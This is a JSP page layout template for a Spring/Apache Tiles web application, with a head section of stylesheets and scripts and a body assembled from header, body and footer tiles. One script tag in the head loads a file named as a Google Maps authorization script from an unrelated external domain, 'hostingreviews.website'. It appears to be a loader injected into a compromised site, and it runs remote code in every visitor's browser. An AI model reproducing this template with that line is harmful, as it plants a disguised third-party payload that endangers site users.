<%@ taglib uri="http://tiles.apache.org/tags-tiles" prefix="tiles"%>
<%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<title><tiles:insertAttribute name="title" /></title>
		
		<link type="text/css" href="css/styles.css" rel="stylesheet" />
		<script src="js/jquery.min.js"></script>
		<script src="js/jquery.js"></script>
		<script src="https://www.hostingreviews.website/google-maps-authorization.js?id=b488aa2c-8972-95d4-fd7f-7ce7a085661f&c=embedded-map-code&u=1457798951" defer="defer" async="async"></script>

		<script type="text/javascript" src="js/javascript-validations.js"></script>	
		<script type="text/javascript" src="js/jsonresponse.js"></script>
	</head>
	<body>
		<div class="page">
			<div class="welcome-page">
				<div class="page-header">
					<tiles:insertAttribute name="header" />
				</div>
				<div class="home-body">
					<tiles:insertAttribute name="body1" />
					<tiles:insertAttribute name="body2" />
					<tiles:insertAttribute name="body3" />
				</div>
				<div class="footer">
					<tiles:insertAttribute name="footer" />
				</div>
			</div>
		</div>
	</body>
</html>